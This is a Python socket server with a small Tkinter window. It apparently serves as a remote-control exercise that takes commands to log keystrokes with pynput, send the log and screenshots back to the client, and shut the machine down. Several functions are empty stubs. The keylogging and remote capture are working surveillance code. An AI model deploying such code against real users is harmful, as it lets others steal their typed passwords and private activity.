import socket
import pyautogui
from PIL import ImageGrab
import io
import os
import tkinter as tk
import threading
from pynput import keyboard
import atexit

HOST = "127.0.0.1"
PORT = 65431

#####################################################################
# send keystroke
def on_key_press(key, client_socket):
    key = str(key)
    key = key.replace("'", "")
    if (key == "Key.ctrl_l"):
        key = ""
    if (key == "Key.enter"):
        key = "\n"
    if (key == "Key.space"):
        key = " "
    if (len(key) > 2):
        key = " " + key
    with open("log.txt", "a") as file:
        file.write(key)

def Listening(client_socket, stop_event):
    listener = keyboard.Listener(on_press=lambda key: on_key_press(key, client_socket))
    listener.start()
    stop_event.wait()
    listener.stop()

def handle_client(client_socket):
    print("Handle client")
    stop_event = threading.Event()
    listener_thread = None
    while (True):
        data = client_socket.recv(1024).decode()
        data = str(data)
        print(f"Hanle event of key stroke : {data}")
        if (data == "HOOK"):
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread stopped.")
            stop_event.clear()
            listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
            listener_thread.start()
        if (data == "UNHOOK"):
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread stopped.")
                listener_thread = None
        if (data == "PRINT"):
            hasThread = False
            # Stop the thread
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread stopped.")
                hasThread = True
                print(f"hasThread : {hasThread}")

            if os.path.exists("log.txt"):
                with open('log.txt', 'rb') as file:
                    file_data = file.read()
            else: 
                file_data = b"?"
            client_socket.sendall(file_data)

            # Recreate the thread
            if (hasThread):
                stop_event.clear()
                listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
                listener_thread.start()
        if (data == "DELETE"):
            if os.path.exists('log.txt'):
                os.remove('log.txt')
        if (data == "CLOSE"):
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread stopped.")
            print("Break loops")
            break

def send_keystroke(client_socket):
    handle_client(client_socket)

#####################################################################
# Screenshot
def take_screenshot(client_socket):
    print("Taking screenshot...")
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png") 

    file = open("screenshot.png", 'rb');
    image_data = file.read(2048);
    while (image_data):
        client_socket.send(image_data);
        image_data = file.read(2048)
    file.close()
    print("Screenshot sent")

    # Remove the picture
    image_path = "screenshot.png"
    try:
        os.remove(image_path)
        print(f"Image {image_path} deleted successfully.")
    except OSError as e:
        print(f"Error deleting image: {e}")

#####################################################################
# Running Apps
def app_running_check(app_name):
    print(f"Checking if {app_name} is running...")


#####################################################################
# Running Process
def process_running_check(process_name):
    print(f"Checking if {process_name} is running...")

#####################################################################
# Shutdown
def ShutDown(countdown_seconds=10):
    print("ShuttingDown")
    print(f"Initiating system shutdown in {countdown_seconds} seconds...")

    # Create a countdown window
    ShutDownRoot = tk.Tk()
    ShutDownRoot.title("Shutdown Countdown")
    ShutDownRoot.geometry("300x100")
    
    label = tk.Label(ShutDownRoot, text="System will shut down in", font=("Helvetica", 14))
    label.pack(pady=20)

    time_left = countdown_seconds
    label_time = tk.Label(ShutDownRoot, text=str(time_left), font=("Helvetica", 30))
    label_time.pack()

    def update_time():
        nonlocal time_left
        label_time.config(text=str(time_left))
        if time_left > 0:
            time_left -= 1
            ShutDownRoot.after(1000, update_time)
        else:
            ShutDownRoot.destroy()
            print("Shutting down the system...")
            os.system("sudo shutdown -h now")

    ShutDownRoot.after(1000, update_time)
    ShutDownRoot.mainloop()

#####################################################################
# Fix_Regsistry
def fix_registry():
    print("Fixing the registry...")

def handle_command(client_socket, command):
    parts = command.split()
    if parts[0] == "SendKeyStroke":
        send_keystroke(client_socket)
    elif parts[0] == "TakeScreenShot":
        take_screenshot(client_socket)
    elif parts[0] == "AppRunningChecking":
        app_running_check(parts[1])
    elif parts[0] == "ProcessRunningChecking":
        process_running_check(parts[1])
    elif parts[0] == "ShutDownComputer":
        ShutDown()
    elif parts[0] == "FixRegistry":
        fix_registry()

def start_server():
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print("Server is listening...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection established with {client_address}")

        while True:
            data = client_socket.recv(1024)
            if not data:
                break

            command = data.decode("utf-8")
            print(f"Received command: {command}")
            handle_command(client_socket, command)

        client_socket.close()
        print(f"Connection with {client_address} closed")

def close_server():
    try:
        server_socket.shutdown(socket.SHUT_RDWR)  # Shutdown the socket's read and write operations
        server_socket.close()  # Close the socket
        print("Server socket closed.")
    except Exception as e:
        print("Error while closing server socket:", e)

def on_closing():
    close_server()  # Close the client socket
    print("Client socket closed.")
    root.destroy()

def start_server_thread():
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

####################################################
# Server UI
root = tk.Tk()
root.title("Server UI")
root.geometry("300x200")
root.resizable(False, False)

open_button = tk.Button(root, text="Open", width=6, height=3, command=start_server_thread)
open_button.pack(pady=10)

close_button = tk.Button(root, text="Close", width=6, height=3, command=close_server)
close_button.pack(pady=10)

root.protocol("WM_DELETE_WINDOW", on_closing)

if __name__ == "__main__":
    root.mainloop()